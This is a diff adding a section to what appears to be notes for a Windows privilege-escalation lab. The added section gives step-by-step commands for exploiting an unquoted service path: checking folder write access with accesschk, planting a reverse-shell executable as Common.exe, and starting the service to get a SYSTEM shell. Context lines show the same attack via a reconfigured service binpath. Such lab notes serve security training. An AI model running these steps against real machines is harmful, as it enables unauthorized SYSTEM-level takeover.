@@ -28,3 +28,22 @@ sc qc daclsvc
 sc.exe config daclsvc binpath= "C:\Users\user\reverse.exe"
 net start daclsvc
 ```
+
+### 3. Service Exploits - Unquoted Service Path
+```
+sc qc unquotedsvc or (Get-CimInstance Win32_Service -Filter "Name='Spooler'").PathName
+
+Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
+
+C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
+
+Copy the reverse.exe executable you created to this directory and rename it Common.exe:
+
+copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+
+Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+net start unquotedsvc
+```
+
+
